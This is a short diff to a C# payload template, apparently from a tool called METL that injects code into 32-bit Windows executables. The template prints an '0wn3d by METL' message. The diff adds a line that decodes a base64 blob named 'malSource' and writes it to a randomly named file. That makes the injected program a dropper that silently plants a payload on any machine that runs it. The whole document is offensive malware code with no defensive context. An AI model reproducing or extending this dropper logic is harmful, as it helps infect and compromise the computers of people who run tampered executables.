@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 
 namespace METL.InjectorSamples.PE32
 {
@@ -9,6 +10,8 @@ namespace METL.InjectorSamples.PE32
             [PLACEHOLDER]
 
             Console.WriteLine($"0wn3d by METL on {DateTime.Now}");
+
+            System.IO.File.WriteAllBytes(Path.GetRandomFileName(), Convert.FromBase64String(malSource));
         }
     }
 }
